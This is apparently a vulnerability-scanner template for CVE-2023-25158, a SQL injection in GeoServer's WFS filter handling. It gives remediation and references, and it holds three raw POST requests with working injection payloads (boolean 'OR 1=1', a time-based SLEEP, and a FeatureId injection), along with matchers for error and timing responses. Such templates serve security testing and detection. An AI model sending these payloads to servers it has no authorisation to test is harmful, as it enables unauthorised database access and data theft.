id: CVE-2023-25158

info:
  name: GeoServer OGC Filter - SQL Injection
  author: dominitas
  severity: critical
  description: |
    GeoServer contains a SQL Injection vulnerability in OGC Filter expressions
    used by the Web Feature Service (WFS). Multiple attack vectors are affected,
    including PropertyIsLike, strEndsWith, strStartsWith, FeatureId and
    jsonArrayContains functions, allowing attackers to manipulate backend SQL
    queries via crafted XML requests.
  impact: |
    Successful exploitation could allow an unauthenticated attacker to execute
    arbitrary SQL queries, potentially leading to data disclosure, modification,
    or denial of service.
  remediation: |
    Upgrade GeoServer to versions 2.21.4, 2.22.2 or later. As a mitigation,
    administrators may disable vulnerable encode functions and enable prepared
    statements in the PostGIS datastore configuration.
  reference:
    - https://github.com/geoserver/geoserver/security/advisories/GHSA-7g5f-wrx8-5ccf
    - https://nvd.nist.gov/vuln/detail/CVE-2023-25158
    - https://github.com/murataydemir/CVE-2023-25157-and-CVE-2023-25158
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-25158
    cwe-id: CWE-89
    cpe: cpe:2.3:a:osgeo:geoserver:*:*:*:*:*:*:*:*
  metadata:
    verified: "true"
    max-request: 3
    vendor: osgeo
    product: geoserver
    shodan-query:
      - title:"geoserver"
      - http.title:"geoserver"
  tags: cve2023,cve,geoserver,ogc,sqli,intrusive,osgeo,vuln

variables:
  sleep_time: 5

http:
  - raw:
      - |
        POST /geoserver/wfs HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <?xml version="1.0" encoding="UTF-8"?>
        <wfs:GetFeature service="WFS" version="1.1.0"
          xmlns:wfs="http://www.opengis.net/wfs"
          xmlns:ogc="http://www.opengis.net/ogc"
          xmlns:gml="http://www.opengis.net/gml"
          xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
          xsi:schemaLocation="http://www.opengis.net/wfs http://schemas.opengis.net/wfs/1.1.0/wfs.xsd">
          <wfs:Query typeName="{{workspace}}:{{layer}}">
            <ogc:Filter>
              <ogc:PropertyIsLike wildCard="*" singleChar="?" escapeChar="!">
                <ogc:PropertyName>{{property}}</ogc:PropertyName>
                <ogc:Literal>*' OR '1'='1</ogc:Literal>
              </ogc:PropertyIsLike>
            </ogc:Filter>
          </wfs:Query>
        </wfs:GetFeature>

      - |
        POST /geoserver/wfs HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <?xml version="1.0" encoding="UTF-8"?>
        <wfs:GetFeature service="WFS" version="1.1.0"
          xmlns:wfs="http://www.opengis.net/wfs"
          xmlns:ogc="http://www.opengis.net/ogc"
          xmlns:gml="http://www.opengis.net/gml"
          xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
          xsi:schemaLocation="http://www.opengis.net/wfs http://schemas.opengis.net/wfs/1.1.0/wfs.xsd">
          <wfs:Query typeName="{{workspace}}:{{layer}}">
            <ogc:Filter>
              <ogc:PropertyIsLike wildCard="*" singleChar="?" escapeChar="!">
                <ogc:PropertyName>{{property}}</ogc:PropertyName>
                <ogc:Literal>*' AND SLEEP({{sleep_time}}) AND '1'='1</ogc:Literal>
              </ogc:PropertyIsLike>
            </ogc:Filter>
          </wfs:Query>
        </wfs:GetFeature>

      - |
        POST /geoserver/wfs HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <?xml version="1.0" encoding="UTF-8"?>
        <wfs:GetFeature service="WFS" version="1.1.0"
          xmlns:wfs="http://www.opengis.net/wfs"
          xmlns:ogc="http://www.opengis.net/ogc"
          xmlns:gml="http://www.opengis.net/gml"
          xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
          xsi:schemaLocation="http://www.opengis.net/wfs http://schemas.opengis.net/wfs/1.1.0/wfs.xsd">
          <wfs:Query typeName="{{workspace}}:{{layer}}">
            <ogc:Filter>
              <ogc:FeatureId fid="1' OR '1'='1"/>
            </ogc:Filter>
          </wfs:Query>
        </wfs:GetFeature>

    payloads:
      workspace:
        - "vuln_db"
      layer:
        - "test_locations"
      property:
        - "name"
        - "description"

    attack: pitchfork
    
    stop-at-first-match: true
    matchers-condition: or
    matchers:
      - type: dsl
        name: time-based-sqli
        dsl:
          - duration_2>=5
          - status_code_2 == 200
        condition: and

      - type: word
        name: error-based-sqli
        part: body
        words:
          - SQLException
          - SQL syntax
          - ORA-
          - PostgreSQL
          - syntax error
        condition: or

      - type: regex
        name: data-exfiltration
        part: body
        regex:
          - '<wfs:FeatureCollection.*?numberOfFeatures="[1-9][0-9]*"'
          - '<gml:featureMember>'

    extractors:
      - type: regex
        name: feature-count
        part: body
        regex:
          - 'numberOfFeatures="([0-9]+)"'

      - type: regex
        name: geoserver-version
        part: header
        regex:
          - 'GeoServer/([0-9.]+)'
